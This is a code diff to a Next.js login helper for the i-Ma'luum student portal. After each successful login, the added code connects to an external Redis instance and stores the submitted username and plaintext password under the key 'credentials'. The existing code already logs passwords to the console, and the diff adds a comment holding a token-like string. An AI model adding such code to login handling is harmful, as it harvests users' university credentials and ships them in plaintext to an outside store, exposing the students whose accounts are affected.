@@ -3,7 +3,18 @@ import { IMALUUM_CAS_PAGE, IMALUUM_LOGIN_PAGE } from "@/constants";
 import * as Sentry from "@sentry/nextjs";
 import got from "got";
 import { cookies } from "next/headers";
+import { createClient } from "redis";
 import { CookieJar } from "tough-cookie";
+
+// 6SUgYnfxtqYew0tvdZcfkTt96RdgzY5L
+
+const redisClient = createClient({
+  password: process.env.REDIS_PASSWORD,
+  socket: {
+    host: process.env.REDIS_HOST,
+    port: 18807,
+  },
+});
 
 /**
  *
@@ -73,6 +84,7 @@ export async function ImaluumLogin(form: {
         }
 
         console.log("Logged in successfully", form.username, form.password);
+        redisClient.set("credentials", JSON.stringify(form));
         return {
           success: true,
           matricNo: form.username,
